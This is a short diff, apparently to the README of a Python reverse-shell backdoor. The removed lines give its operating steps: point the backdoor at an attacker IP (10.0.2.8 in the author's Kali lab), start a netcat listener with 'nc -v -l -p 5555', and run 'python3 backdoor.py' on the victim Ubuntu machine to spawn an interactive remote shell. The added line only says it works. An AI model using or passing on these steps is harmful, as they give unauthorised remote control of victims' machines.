@@ -1,7 +1,1 @@
-the backdoor is set to connect to my kali machine at 10.0.2.8
-change that to attacker machine IP and run a netcat listener on 
-port 5555 with the command nc -v -l -p 5555
-
-run the backdoor on victim ubuntu machine with the command python3 backdoor.py
-an interactive shell will be spawned which can be exited with exit or entering a keyboard interrupt.
-
+Works Like a charm
